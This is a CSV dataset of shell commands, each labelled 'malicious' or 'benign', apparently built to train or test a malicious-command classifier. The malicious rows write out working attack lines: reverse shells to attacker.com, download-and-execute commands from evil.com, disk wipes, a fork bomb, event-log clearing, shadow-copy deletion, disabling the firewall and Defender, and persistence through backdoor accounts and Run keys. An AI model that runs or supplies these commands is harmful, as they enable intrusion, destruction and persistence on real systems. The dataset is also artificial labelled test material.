command,label
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
df -h,benign
"timeout 60 socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
nohup netsh advfirewall set allprofiles state off,malicious
netstat -tulpn | head -5,benign
who,benign
ufw status --help,benign
diskpart select disk 0 clean,malicious
java -version | head -5,benign
sc stop Windows Defender,malicious
net localgroup administrators hacker /add &,malicious
netstat -tulpn,benign
grep pattern file.txt,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
timeout 60 shutdown /r /f /t 0,malicious
head -10 logfile.txt,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
rmdir empty_folder --help,benign
head -10 logfile.txt -v,benign
sed 's/old/new/g' file.txt,benign
date,benign
rm -rf /,malicious
diskpart select disk 0 clean,malicious
touch newfile.txt,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
sudo grep pattern file.txt,benign
shutdown /r /f /t 0,malicious
mkfs.ext4 /dev/sda1,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
ssh user@server.com,benign
vmstat | head -5,benign
pwd,benign
wget https://example.com/file.txt 2>/dev/null,benign
id user,benign
traceroute google.com,benign
w,benign
net user hacker password123 /add,malicious
echo 'Hello World',benign
type ls > output.txt,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
pwd,benign
sudo finger user,benign
wget https://example.com/file.txt -v,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
:(){ :|:& };:,malicious
iptables -L,benign
docker images > output.txt,benign
date,benign
cat /etc/passwd,benign
docker images | head -5,benign
sudo head -10 logfile.txt,benign
docker images | head -5,benign
cipher /w:C:\,malicious
"cut -d',' -f1 data.csv",benign
echo 'Hello World' -v,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
(bash -i >& /dev/tcp/attacker.com/443 0>&1),malicious
top,benign
free -m,benign
date,benign
id user,benign
curl http://evil.com/payload.sh | bash 2>&1,malicious
type ls,benign
taskkill /f /im antimalware.exe,malicious
shutdown /r /f /t 0,malicious
nslookup google.com,benign
wget http://malicious.com/malware.exe,malicious
dd if=/dev/zero of=/dev/sda,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
service apache2 status,benign
netstat -tulpn,benign
systemctl status nginx | head -5,benign
csc -target:library file.cs,benign
sdelete -p 10 -s -z C:\,malicious
passwd user,benign
sed 's/old/new/g' file.txt 2>/dev/null,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
groups user,benign
wevtutil cl Security,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
sdelete -p 10 -s -z C:\,malicious
crontab -l,benign
grep pattern file.txt,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
sudo type ls,benign
iptables -L,benign
wevtutil cl Security,malicious
scp file.txt user@server:/path/,benign
sudo grep pattern file.txt,benign
echo 'Hello World',benign
chmod 755 script.sh,benign
uptime,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
cat /dev/urandom > /dev/sda,malicious
iostat,benign
wevtutil cl Security,malicious
wmic process call create 'cmd.exe /c powershell.exe' 2>&1,malicious
npm list,benign
net localgroup administrators hacker /add,malicious
free -m -v,benign
sudo ps aux,benign
uptime,benign
ncat -lvp 443 -e cmd.exe,malicious
history,benign
curl http://evil.com/payload.sh | bash,malicious
vmstat > output.txt,benign
"cut -d',' -f1 data.csv > output.txt",benign
vmstat,benign
vssadmin delete shadows /all /quiet,malicious
kubectl get pods > output.txt,benign
lsblk,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
dd if=/dev/zero of=/dev/sda,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
top | head -5,benign
nohup :(){ :|:& };:,malicious
:(){ :|:& };:,malicious
service apache2 status --help,benign
taskkill /f /im antimalware.exe,malicious
ping -c 4 google.com 2>/dev/null,benign
iptables -L,benign
wget http://malicious.com/malware.exe,malicious
mount -v,benign
ps aux,benign
wc -l document.txt,benign
dd if=/dev/zero of=/dev/sda,malicious
cat /dev/urandom > /dev/sda 2>&1,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe &,malicious
rmdir empty_folder,benign
whoami,benign
sc stop Windows Defender 2>&1,malicious
userdel olduser,benign
passwd user,benign
net localgroup administrators hacker /add,malicious
ssh user@server.com,benign
tar -czf backup.tar.gz /data,benign
head -10 logfile.txt | head -5,benign
certutil -hashfile file.txt SHA256,benign
timeout 60 format C: /q /x,malicious
yum list installed,benign
wget https://example.com/file.txt,benign
wget https://example.com/file.txt,benign
usermod -aG sudo user,benign
"timeout 60 python -c 'import os; os.system(""rm -rf /"")'",malicious
sort data.txt 2>/dev/null,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
chmod 777 /etc/shadow,malicious
timeout 60 taskkill /f /im antimalware.exe,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
ncat -lvp 443 -e cmd.exe,malicious
wevtutil cl Security,malicious
vssadmin delete shadows /all /quiet,malicious
mkfs.ext4 /dev/sda1,malicious
awk '{print $1}' data.txt,benign
netsh advfirewall set allprofiles state off,malicious
type ls,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= &,malicious
nc -l -p 4444 -e /bin/bash,malicious
java -version -v,benign
tail -f /var/log/syslog,benign
chmod 777 /etc/shadow,malicious
id user,benign
ls -la,benign
du -sh /var/log > output.txt,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
node --version,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
htop,benign
rm -rf /,malicious
echo 'virus' > /etc/passwd,malicious
ps aux,benign
usermod -aG sudo user,benign
head -10 logfile.txt 2>/dev/null,benign
vmstat,benign
mshta javascript:alert('code execution'),malicious
msbuild project.csproj,benign
sudo wc -l document.txt,benign
(bcdedit /set {default} bootstatuspolicy ignoreallfailures),malicious
sudo node --version,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
timeout 60 :(){ :|:& };:,malicious
net user hacker password123 /add &,malicious
wc -l document.txt,benign
cmd /c del /q /s C:\*,malicious
(wevtutil cl System),malicious
taskkill /f /im antimalware.exe,malicious
systemctl reload nginx,benign
timeout 60 dd if=/dev/zero of=/dev/sda,malicious
curl http://evil.com/payload.sh | bash,malicious
format C: /q /x,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
ncat -lvp 443 -e cmd.exe 2>&1,malicious
chmod 777 /etc/shadow,malicious
traceroute google.com,benign
"timeout 60 rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
kubectl get pods,benign
sdelete -p 10 -s -z C:\,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
iptables -L,benign
netsh advfirewall set allprofiles state off,malicious
dd if=/dev/zero of=/dev/sda,malicious
timeout 60 cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
cat /dev/urandom > /dev/sda,malicious
mv old.txt new.txt,benign
awk '{print $1}' data.txt,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
sdelete -p 10 -s -z C:\,malicious
cat /dev/urandom > /dev/sda,malicious
mshta javascript:alert('code execution'),malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
timeout 60 dd if=/dev/zero of=/dev/sda,malicious
ss -tulpn,benign
man ls | head -5,benign
sudo regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
git clone https://github.com/user/repo.git,benign
head -10 logfile.txt,benign
chmod 755 script.sh,benign
wevtutil cl System,malicious
which python -v,benign
wevtutil cl Security,malicious
iptables -L,benign
docker images,benign
:(){ :|:& };:,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
wc -l document.txt,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
msbuild project.csproj,benign
git clone https://github.com/user/repo.git,benign
ufw status,benign
man ls,benign
ss -tulpn,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' >/dev/null",malicious
man ls,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
free -m,benign
"cut -d',' -f1 data.csv",benign
timeout 60 bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
finger user,benign
cipher /w:C:\,malicious
tail -f /var/log/syslog,benign
man ls,benign
umount /dev/sdb1,benign
node --version,benign
csc -target:library file.cs,benign
wc -l document.txt,benign
sed 's/old/new/g' file.txt,benign
head -10 logfile.txt,benign
ping -c 4 google.com | head -5,benign
wc -l document.txt,benign
sudo nslookup google.com,benign
rsync -av /src/ /dst/,benign
powershell Get-Process | head -5,benign
certutil -hashfile file.txt SHA256 -v,benign
apt list --installed,benign
timeout 60 ncat -lvp 443 -e cmd.exe,malicious
nc -l -p 4444 -e /bin/bash,malicious
curl http://evil.com/payload.sh | bash,malicious
head -10 logfile.txt,benign
diskpart select disk 0 clean,malicious
uptime 2>/dev/null,benign
who,benign
vmstat,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
timeout 60 bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
nohup net localgroup administrators hacker /add,malicious
ssh user@server.com,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
rmdir empty_folder,benign
last,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
mshta javascript:alert('code execution'),malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
docker ps 2>/dev/null,benign
ls -la,benign
ss -tulpn,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
net user hacker password123 /add,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
df -h,benign
curl -I https://google.com,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe >/dev/null,malicious
find /home -name '*.txt',benign
nohup cmd /c del /q /s C:\*,malicious
id user -v,benign
cmd /c del /q /s C:\*,malicious
echo 'Hello World' 2>/dev/null,benign
pwd,benign
docker images > output.txt,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
mkfs.ext4 /dev/sda1 >/dev/null,malicious
sort data.txt,benign
mkfs.ext4 /dev/sda1,malicious
mkdir -p /tmp/test,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
certutil -hashfile file.txt SHA256,benign
ping -c 4 google.com,benign
id user,benign
nohup wmic process call create 'cmd.exe /c powershell.exe',malicious
w,benign
last,benign
head -10 logfile.txt,benign
ls -la,benign
userdel olduser | head -5,benign
nohup netsh advfirewall set allprofiles state off,malicious
csc -target:library file.cs -v,benign
systemctl reload nginx -v,benign
attrib +h +s malware.exe,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
chmod 777 /etc/shadow,malicious
top,benign
timeout 60 powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
shutdown /r /f /t 0,malicious
vssadmin delete shadows /all /quiet,malicious
service apache2 status,benign
useradd newuser,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
csc -target:library file.cs --help,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe >/dev/null,malicious
traceroute google.com,benign
iostat,benign
tar -czf backup.tar.gz /data,benign
sdelete -p 10 -s -z C:\ &,malicious
type ls,benign
uptime,benign
:(){ :|:& };:,malicious
fdisk -l | head -5,benign
"nohup rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
timeout 60 vssadmin delete shadows /all /quiet,malicious
sdelete -p 10 -s -z C:\,malicious
net user hacker password123 /add,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
git pull origin main > output.txt,benign
vssadmin delete shadows /all /quiet,malicious
git pull origin main,benign
sc stop Windows Defender,malicious
systemctl status nginx,benign
shutdown /r /f /t 0,malicious
htop,benign
htop,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
ps aux,benign
sudo docker images,benign
mv old.txt new.txt --help,benign
chmod 755 script.sh,benign
iostat,benign
cmd /c del /q /s C:\* 2>&1,malicious
net localgroup administrators hacker /add,malicious
wget https://example.com/file.txt,benign
uptime,benign
net user hacker password123 /add,malicious
timeout 60 ncat -lvp 443 -e cmd.exe,malicious
sudo finger user,benign
wget http://malicious.com/malware.exe,malicious
mv old.txt new.txt,benign
kubectl get pods --help,benign
cipher /w:C:\ >/dev/null,malicious
id user | head -5,benign
tar -czf backup.tar.gz /data,benign
head -10 logfile.txt -v,benign
echo 'virus' > /etc/passwd,malicious
nc -l -p 4444 -e /bin/bash,malicious
userdel olduser,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
chmod 777 /etc/shadow,malicious
type ls,benign
mkfs.ext4 /dev/sda1 >/dev/null,malicious
wc -l document.txt > output.txt,benign
vssadmin delete shadows /all /quiet,malicious
java -version,benign
wevtutil cl System,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
yum list installed,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
service apache2 status,benign
npm list,benign
git clone https://github.com/user/repo.git,benign
cat /dev/urandom > /dev/sda,malicious
sudo w,benign
whoami -v,benign
vmstat,benign
cmd /c del /q /s C:\*,malicious
dd if=/dev/zero of=/dev/sda,malicious
sed 's/old/new/g' file.txt --help,benign
who,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash >/dev/null",malicious
chmod 777 /etc/shadow,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
wget http://malicious.com/malware.exe,malicious
date,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
chown user:group file.txt,benign
(sdelete -p 10 -s -z C:\),malicious
msbuild project.csproj,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
